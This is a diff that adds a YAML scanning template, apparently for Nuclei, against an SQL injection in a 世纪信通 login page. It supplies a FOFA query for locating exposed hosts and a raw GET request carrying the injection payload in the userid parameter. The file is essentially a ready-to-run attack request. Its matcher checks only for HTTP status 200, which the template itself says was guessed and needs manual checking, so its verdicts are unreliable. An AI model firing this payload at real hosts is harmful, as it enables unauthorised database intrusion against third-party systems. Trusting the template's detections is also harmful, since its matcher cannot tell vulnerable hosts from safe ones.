@@ -1,0 +1,21 @@
+id: poc-gu3droz8rugd626t
+info:
+  name: 世纪信通SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gu3droz8rugd626t
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gu3droz8rugd626t
+    fofa: FOFA："theme/BlueCharm/" || body="广东世纪信通网络科技有限公司"
+http:
+- raw:
+  - GET /theme/BlueCharm/LoginForm2.aspx?ReadAgent=1&userid=-1'+and+1=user-- HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
